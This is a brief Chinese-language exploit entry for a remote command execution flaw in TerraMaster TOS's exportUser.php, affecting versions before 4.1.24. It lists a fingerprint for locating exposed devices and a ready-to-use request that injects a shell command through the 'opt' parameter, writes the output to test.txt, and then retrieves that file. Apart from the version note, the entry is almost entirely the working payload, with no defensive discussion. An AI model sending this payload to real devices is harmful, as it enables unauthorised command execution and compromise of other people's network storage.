# TerraMasterTOSexportUser.php远程命令执行

- **系统**：TerraMasterTOSexportUser　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"TerraMaster"`

**请求体 / payload**
```
* 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
/include/exportUser.php?type=3&cla=application&func=_exec&opt=(whoami)>test.txt

获取命令执行结果
/include/test.txt
```

**其他**
- 版本: * TerraMaster TOS < 4.1.24